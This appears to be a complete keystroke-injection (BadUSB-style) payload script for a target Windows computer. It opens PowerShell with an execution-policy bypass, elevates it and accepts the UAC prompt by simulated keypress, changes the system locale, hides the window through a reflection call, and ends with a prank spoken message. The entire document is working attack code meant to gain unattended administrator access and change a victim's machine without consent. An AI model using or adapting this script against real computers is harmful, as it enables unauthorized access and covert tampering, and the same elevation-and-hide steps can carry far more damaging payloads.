hide=true; // set to true to hide the console window on the target

layout("us")
press("GUI r");
delay(500);
type("powershell -NoP -NonI -Exec Bypass");
press("CONTROL SHIFT ENTER");
delay(2500);
press("ALT y");
delay(3000);
type("Dism /online /Get-Intl");
press("ENTER")
type("Set-WinSystemLocale en-US");
press("ENTER")
type("Set-WinUserLanguageList en-US -Force");
press("ENTER")
delay(500);

function hidePS() {
	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
  	press("ENTER");
    delay(1000);
}

if (hide) { hidePS(); }
delay(2000);

type("start-sleep 100;Add-Type -AssemblyName System.speech;$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;$speak.Speak(\"Hello. It's your Computer talking! look... I need a Break. I mean... I'm in bad shape, You treat me like shit, and somtimes I just.... well... nevermind\");start-sleep 20;exit")
press("ENTER")